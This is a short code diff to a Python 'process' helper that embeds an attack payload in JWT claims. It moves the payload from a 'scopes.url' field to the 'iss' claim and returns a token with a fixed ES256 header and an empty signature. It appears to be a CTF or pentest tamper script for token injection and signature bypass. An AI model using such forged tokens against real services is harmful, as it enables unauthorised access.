@@ -15,27 +15,27 @@ def process(payload):
 						# change the json according to your jwt setup
 						json.loads(json.dumps(
 							{
-						"jti": "eb0b1270-0f95-4043-b0fc-8995f38dc79f",
-						"namespace": "cloud",
-						"aud": "n/a",
-						"sub": "sicarius.ctf+1@gmail.com",
-						"email": "sicarius.ctf+1@gmail.com",
-						"iss": "IBM API Connect",
-						"token_type": "sign_up",
-						"iat": 1654161610,
-						"scopes": {
-							"url": payload,
-							"actions": [
-							"activate"
-							]
-						}
-						}
+							"exp": 1655041689,
+							"iat": 1655041629,
+							"auth_time": 1655039600,
+							"jti": "54c9a765-58cd-4172-991f-373c73c317b6",
+							"iss": payload,
+							"aud": "mock-pes",
+							"sub": "357bb394-8cb3-42a6-ad3d-819c16cda75a",
+							"typ": "ID",
+							"azp": "mock-pes",
+							"nonce": "637906384287653636.YmYxYTcwN2UtY2I2Zi00MDRmLWI4ZGMtYmQ2Y2FmYmMwYmRhODVmNTZhNWYtMjFiOS00NzM3LThlN2MtZDA4ZjFiYTdjNWNj",
+							"session_state": "843f14e6-57f4-4e03-bcca-bf2034186bfd",
+							"at_hash": "qdZpfAmDXTubKmSSVcAURw",
+							"acr": "0",
+							"sid": "843f14e6-57f4-4e03-bcca-bf2034186bfd"
+							}
 						)),\
 						# Enter your key below
 						KEY,\
 						# change the algorithm if needed
 						algorithm=ALGO)
-	return payload
+	return f"eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJTM0NSbC1xaldjWHFjd21oaVpPTkdkTUlaeXlQbmkteFJ3aUFLQXVUMVkwIn0.{payload.split('.')[1]}."
 
 def unprocess(payload):
 	if isinstance(payload, bytes):
